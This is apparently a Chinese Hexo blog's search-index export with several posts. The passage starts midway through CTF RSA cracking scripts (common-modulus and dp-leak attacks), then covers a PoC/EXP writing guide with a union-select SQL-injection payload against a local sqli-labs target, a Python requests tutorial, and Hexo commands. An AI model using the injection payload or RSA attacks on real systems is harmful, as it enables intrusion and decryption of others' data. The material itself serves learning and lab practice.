alt></p></li><li><p>n=966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</p></li><li><p>p = 310935513029228809998830208036655366162721470228774287453148308675193510132489142448801010943658159980501154153084396100667001391643762749806500051502679498536716532334917842894939889468693960937309663256592497965458780801192062835123429808544757340971089756707788360038227894054989413747980<br>167536893779923551227744017809301855984582408943622461942486239113822841696775958645014753081946441406022729616992302829930205076689399802050792392219242304302303180769915076199603301447453070225380248784444587175874466015595462920262453189072935846093201153746322352707956339337553509285375982422142<br>16674496409625928997877221</p></li><li><p>q = 310935513029228809998830208036655366162721470228774287453148308675193510132489142448801010943658159980501154153084396100667001391643762749806500051502679498536716532334917842894939889468693960937309663256592497965458780801192062835123429808544757340971089756707788360038227894054989413747980<br>167536893779923551227744017809301855984582408943622461942486239113822841696775958645014753081946441406022729616992302829930205076689399802050792392219242304302303180769915076199603301447453070225380248784444587175874466015595462920262453189072935846093201153746322352707956339337553509285375982422142<br>16674496409625928797450473</p></li><li><p><img src="/CTF-RSA/14.png" alt></p></li></ol><p><strong>n/c/d?m</strong></p><ol><li>print hex(pow(c,d,N))[2:-1].decode(‘hex’)</li><li><img src="/CTF-RSA/12.png" alt></li></ol><p><strong>n/e1/e2/c1/c2?m</strong></p><ol><li>import gmpy2</li><li>gcd,a,b=gmpy2.gcdext(e1,e2)</li><li>m=gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n)%n</li></ol><p><strong>p/q/e?d</strong></p><ol><li>import gmpy2</li><li>p =gmpy2.mpz(18443)</li><li>q =gmpy2.mpz(49891)</li><li>e =gmpy2.mpz(19)</li><li>phi_n= (p - 1) * (q - 1)</li><li>d = gmpy2.invert(e, phi_n)</li><li>print (d)<br><img src="/CTF-RSA/2.png" alt></li></ol><p><strong>p/q/e/c?m</strong></p><ol><li>import gmpy2</li><li>#N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</li><li>p = 366669102002966856876605669837014229419</li><li>q = 282164587459512124844245113950593348271</li><li>c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</li><li>e = 65537</li><li></li><li>d = gmpy2.invert(e,(p-1)*(q-1))</li><li>#print d</li><li>#d=91646299298871237857836940212608056141193465208586711901499120163393577626813</li><li>m = gmpy2.powmod(c,d,p*q)</li><li>#print m</li><li>#m=185534734614696481020381637136165435809958101675798337848243069</li><li>#hex(m)=0x73756374667b50776e5f405f68756e647265645f79656172737d</li><li>print hex(m)[2:].decode(‘hex’)<br><img src="/CTF-RSA/3.png" alt></li></ol><p><strong>p/q/e/c?m</strong></p><ol><li>p = 169524110085046954319747170465105648233168702937955683889447853815898670069828343980818367807171215202643149176857117014826791242142210124521380573480143683660195568906553119683192470329413953411905742074448392816913467035316596822218317488903257069007949137629543010054246885909276872349326142152285347048927</li><li>q = 170780128973387404254550233211898468299200117082734909936129463191969072080198908267381169837578188594808676174446856901962451707859231958269401958672950141944679827844646158659922175597068183903642473161665782065958249304202759597168259072368123700040163659262941978786363797334903233540121308223989457248267</li><li>e = 65537</li><li>c = 4531850464036745618300770366164614386495084945985129111541252641569745463086472656370005978297267807299415858324820149933137259813719550825795569865301790252501254180057121806754411506817019631341846094836070057184169015820234429382145019281935017707994070217705460907511942438972962653164287761695982230728969508370400854478181107445003385579261993625770566932506870421547033934140554009090766102575218045185956824020910463996496543098753308927618692783836021742365910050093343747616861660744940014683025321538719970946739880943167282065095406465354971096477229669290277771547093476011147370441338501427786766482964</li><li></li><li>#计算d</li><li>def egcd(a, b): #gcd最大公约数</li><li>if a == 0:</li><li>return (b, 0, 1)</li><li>else:</li><li>g, y, x = egcd(b % a, a)</li><li>return (g, x - (b // a) * y, y)</li><li></li><li>d = egcd((p - 1) * (q - 1), e)[2]</li><li>if d &lt; 0:</li><li>d += (p - 1) * (q - 1)</li><li></li><li>m = hex(pow(c,d,p*q))[2:-1].decode(‘hex’)</li><li>print m<br><img src="/CTF-RSA/5.png" alt></li></ol><p><strong>e/n/dp/c?m</strong></p><ol><li>import gmpy2</li><li>e=65537</li><li>n=9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</li><li>dp=81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</li><li>c=5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</li><li></li><li>stuff=dp*e-1</li><li>for k in range(1,e):</li><li>if stuff%k==0:  #p should be an integer</li><li>p1=stuff//k+1</li><li>if n%p1==0: #p should divide n</li><li>p=p1</li><li>q=n//p</li><li>phi=(p-1)*(q-1)</li><li>d=gmpy2.invert(e,phi)</li><li>m=pow(c,d,n)</li><li>print bytearray.fromhex(hex(pow(c,d,n))[2:])</li><li><img src="/CTF-RSA/18.png" alt></li></ol><p><strong>pem/enc?m</strong></p><ol><li><img src="/CTF-RSA/19.png" alt></li></ol><h2 id="0x09-RSA安全要求"><a href="#0x09-RSA安全要求" class="headerlink" title="0x09 RSA安全要求"></a>0x09 RSA安全要求</h2><ol><li>定期更新密钥</li><li>不同用户使用不同模数n</li><li>p、q相差较大</li><li>e不可以太小</li><li>d不可以太小</li></ol><h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ul><li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li><li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">https://www.freebuf.com/</a></li><li><a href="https://www.jianshu.com/" target="_blank" rel="noopener">https://www.jianshu.com/</a></li><li><a href="https://www.jianshu.com/p/c945b0f0de0a" target="_blank" rel="noopener">https://www.jianshu.com/p/c945b0f0de0a</a></li><li><a href="https://blog.csdn.net/huanghelouzi/article/details/82974741" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82974741</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> encrypt_decrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POC&amp;EXP_Write</title>
      <link href="/POC&amp;EXP_Write/"/>
      <url>/POC&amp;EXP_Write/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-POC-amp-EXP"><a href="#0x00-POC-amp-EXP" class="headerlink" title="0x00 POC &amp; EXP"></a>0x00 POC &amp; EXP</h2><ol><li>POC（Proof of Concept）：概念验证（Google翻译，即漏洞验证）</li><li>EXP（Exploit）：(漏洞)利用</li></ol><p><strong>编写POC</strong></p><ol><li>目的：复现漏洞环境，实现代码化去验证漏洞的存在。</li><li></li><li>写POC的脚本语言有很多种，如python、ruby、php、perl、lua、shell脚本等等</li><li></li><li>注意：验证过程中，必需有效、对系统无害且影响低。</li></ol><h2 id="0x01-POC的特性：随机性、确定性、通用性、无害性"><a href="#0x01-POC的特性：随机性、确定性、通用性、无害性" class="headerlink" title="0x01 POC的特性：随机性、确定性、通用性、无害性"></a>0x01 POC的特性：随机性、确定性、通用性、无害性</h2><p><strong>随机性</strong></p><ol><li>随机生成无关重要的相关数据、变量等，禁用固定的值生成 Payload。</li><li>payload禁用与自己或身边相关的属性的值。</li><li>如：文件名、payload名、密码、输出值、路径、参数值等。</li><li>&gt;&gt;&gt; ‘’.join([random.choice(string.ascii_lowercase) for _ in range(10)])</li><li>‘qiujmgtedh’</li></ol><p><strong>确定性</strong><br>通过对比返回内容，找到唯一的标识可以确定漏洞是否存在的。</p><p><strong>通用性</strong><br>兼顾各种环境，各种平台，兼顾当前版本之前的多个版本。</p><ol><li>要考虑不同版本下存在漏洞的路径、参数名是否变更，不同系统下的请求与响应是否一样、API接口是否一致等不同情况。</li><li>如/etc/passwd，只使用*nix系统</li></ol><p><strong>无害性</strong></p><ol><li>在无损害的情况下有效验证漏洞的是否存在。</li><li>如：不增删改数据或文件等</li></ol><h2 id="0x02-POC编写流程"><a href="#0x02-POC编写流程" class="headerlink" title="0x02 POC编写流程"></a>0x02 POC编写流程</h2><ol><li>根据漏洞详情，寻找受影响的版本，各种历史版本，github上的tag、branch、release</li><li>搭建对应的漏洞靶场</li><li>复现漏洞</li><li>分析漏洞，弄清楚漏洞存在的条件</li><li>写POC，相当于自动化验证漏洞，返回可明确判断的关键字来判断漏洞是否存在。</li><li>测试POC</li></ol><h2 id="0x03-验证漏洞"><a href="#0x03-验证漏洞" class="headerlink" title="0x03 验证漏洞"></a>0x03 验证漏洞</h2><p><strong>直接判断</strong></p><ol><li>sql报错注入</li><li>import requests</li><li></li><li>url=’<a href="http://127.0.0.1/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=&#39;</a> #正常访问</li><li>payload=’1%27%20union%20select%201,2,(select%20%27qwq%27)%23’</li><li></li><li>url=url+payload</li><li></li><li>r=requests.get(url=url)</li><li>if ‘qwq’ in r.text:</li><li>print(‘OK’)</li><li>else:</li><li>print(‘NO’)</li></ol><p><strong>间接判断</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> EXP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python_requests模块</title>
      <link href="/Python-requests/"/>
      <url>/Python-requests/</url>
      
        <content type="html"><![CDATA[<h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p><strong>安装与导入requests模块</strong></p><ol><li>pip install requests</li><li>import requests</li></ol><h2 id="设定各种请求参数、请求头"><a href="#设定各种请求参数、请求头" class="headerlink" title="设定各种请求参数、请求头"></a>设定各种请求参数、请求头</h2><ol><li>headers={‘user-agent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36’}</li><li>cookies={‘key’:’value’}</li><li>allow_redirects = false #请求里可带参数，阻止重定向</li><li>timeout=5 #请求里可带参数，设置5秒超时</li><li>s=requests.Session() #保持会话</li><li>verify=True #为HTTPS请求验证SSL证书</li><li>verify=False #或许可以访问，但可能会有警告，再补上下一句</li><li>urllib3.disable_warnings()</li><li>proxies={‘http’:’<a href="http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}" target="_blank" rel="noopener">http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}</a> #代理</li><li>proxies={‘http’:’<a href="http://user:pass@10.0.0.10:12345/&#39;}" target="_blank" rel="noopener">http://user:pass@10.0.0.10:12345/&#39;}</a> #需要用户密码的代理</li></ol><h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p><strong>各种http方法不带参数请求网页</strong></p><ol><li>import requests </li><li>r=requests.get(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li><li>r=requests.post(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li><li>r=requests.head(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li><li>r=requests.put(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li><li>r=requests.options(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li><li>r=requests.delete(‘<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a>)</li></ol><p><strong>get方法带参数请求网页</strong></p><ol><li>import requests</li><li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a> </li><li>r=requests.get(url=url,params={‘id’:’123’})</li><li>params={‘name’:’admin’}</li><li>r=requests.get(url=url,params=params)</li></ol><p><strong>post方法带参数请求网页</strong></p><ol><li>import requests</li><li>import json</li><li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a></li><li>r=requests.post(url=url,data=json.dumps({‘id’:’1’}))</li><li>r.json()</li></ol><p><strong>post上传文件</strong></p><ol><li>import requests</li><li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a></li><li>files={‘file’:open(‘1.txt’,’rb’)}</li><li>r=requests.post(url,files=files)</li></ol><h2 id="请求汇总"><a href="#请求汇总" class="headerlink" title="请求汇总"></a>请求汇总</h2><ol><li>import requests</li><li>url=’<a href="http://www.baidu.com/&#39;" target="_blank" rel="noopener">http://www.baidu.com/&#39;</a></li><li>params={‘username’:’admin’,’password’:’admin123’}</li><li>headers={‘user-agent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36’}</li><li>proxies={‘http’:’<a href="http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}" target="_blank" rel="noopener">http://10.0.0.10:12345&#39;,&#39;https&#39;:&#39;http://192.168.1.1:23456&#39;}</a> </li><li>cookies={‘key’:’value’}</li><li>r=requests.get(url=url,headers=headers,params=params,cookies=cookies,proxies=proxies,allow_redirects = false,timeout=5,verify=True) #allow_redirects = false 阻止重定向，timeout=5 设置5秒超时</li><li>s=requests.Session() </li><li>s.auth={‘username’:’admin’,’password’:’admin123’}</li><li>s.headers={‘user-agent’:’Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36’}</li><li>r=s.get(url=url)</li></ol><p><strong>JSON请求</strong></p><ol><li>import requests</li><li>import json</li><li></li><li>url=’url’</li><li>json={‘key1’:’value1’,’key2’:’value2’,’key3’:’value3’}</li><li>r=requests.get(url=url,data=json)</li></ol><p><strong>xml请求</strong></p><ol><li>import requests</li><li></li><li>url=’url’</li><li>xml=’<?xml version=\"1.0\" encoding=\"utf-8\"?><a></a>‘</li><li>r=requests.get(url=url,data=xml)</li></ol><p><strong>身份验证</strong></p><ol><li>import requests</li><li>from requests.auth import HTTPBasicAuth</li><li></li><li>r=reuqests.get(url,auth=HTTPBasicAuth(‘user’:’admin’,’pass’:’123456’))</li><li>print(r.json())</li></ol><h2 id="获取响应"><a href="#获取响应" class="headerlink" title="获取响应"></a>获取响应</h2><ul><li>r.apparent_encoding #获取网页的编码格式</li><li>r.encoding #获取当前的编码</li><li>r.text #以encoding解析返回内容</li><li>r.content #以字节形式（二进制）返回</li><li>r.headers #以字典形式返回响应头</li><li>r.requests.headers ##返回请求头</li><li>r.status_code #响应状态码</li><li>r.raw #返回原始响应码</li><li>r.ok #布尔值判断成功</li><li>r.json() #Requests中内置的JSON解码器，以json形式返回</li><li>r.raise_for_status() 抛出异常</li><li>r.history #返回重定向信息</li></ul><p><strong>获取指定响应头</strong></p><ol><li>r.headers[‘Content-Type’] #获取响应内容类型</li><li>r.headers.get(‘Content-Type’) #获取响应内容类型</li><li>r.cookies[‘example_cookie_name’] #获取指定cookie值</li></ol><h2 id="python模拟登录github"><a href="#python模拟登录github" class="headerlink" title="python模拟登录github"></a>python模拟登录github</h2><ol><li>import requests</li><li>from bs4 import BeautifulSoup</li><li></li><li>def login_github():</li><li>#获取token</li><li>r=requests.get(‘<a href="https://github.com/login&#39;" target="_blank" rel="noopener">https://github.com/login&#39;</a>) #获取URL内容</li><li>s=BeautifulSoup(r.text,’html.parser’) #使用bs4解析html对象</li><li>token=s.find(‘input’,attrs={‘name’:’authenticity_token’}).get(‘value’) #获取登录授权码，即token</li><li>get_cookies=r.cookies.get_dict() #获取get请求的cookies</li><li></li><li>#发送post请求</li><li>r_post=requests.post(‘<a href="https://github.com/login&#39;,data={&#39;commit&#39;:&#39;Signing+in&#39;,&#39;utf8&#39;:&#39;✓&#39;,&#39;authenticity_token&#39;" target="_blank" rel="noopener">https://github.com/login&#39;,data={&#39;commit&#39;:&#39;Signing+in&#39;,&#39;utf8&#39;:&#39;✓&#39;,&#39;authenticity_token&#39;</a>: token,’login’:’<strong>**</strong>‘,’password’:’<strong>**</strong>‘},cookies=get_cookies)</li><li>login_cookies=r_post.cookies.get_dict() #获取登录后的cookies</li><li>r_login=requests.get(‘<a href="https://github.com/settings/emails&#39;,cookies=login_cookies" target="_blank" rel="noopener">https://github.com/settings/emails&#39;,cookies=login_cookies</a>)</li><li>print(r_login.text)</li><li></li><li>login_github()</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/ecb4d54ad8cf" target="_blank" rel="noopener">https://www.jianshu.com/p/ecb4d54ad8cf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo_help</title>
      <link href="/hexo-help/"/>
      <url>/hexo-help/</url>
      
        <content type="html"><![CDATA[<p><strong>new</strong></p><ul><li>$ hexo new filename/titlename #新建文章</li></ul><p><strong>generate</strong></p><ul><li>$ hexo generate #生成静态文件</li><li>简写：$ hexo g</li></ul><p><strong>deploy</strong></p><ul><li>$ hexo deploy #部署网站</li><li>简写：$ hexo d</li></ul><p><strong>server</strong></p><ul><li>$ hexo server #启动本地服务器，默认<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></li></ul><p><strong>clean</strong></p><ul><li>$ hexo clean #清除缓存文件（db.json）和已生成的静态文件（public）</li></ul><p><strong>version</strong></p><ul><li>$ hexo version #查看版本</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://hexo.io/zh-cn/docs/commands.html" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/commands.html</a></li><li><a href="https://www.jianshu.com/p/ace7e6b9b2bc" target="_blank" rel="noopener">https://www.jianshu.com/p/ace7e6b9b2bc</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
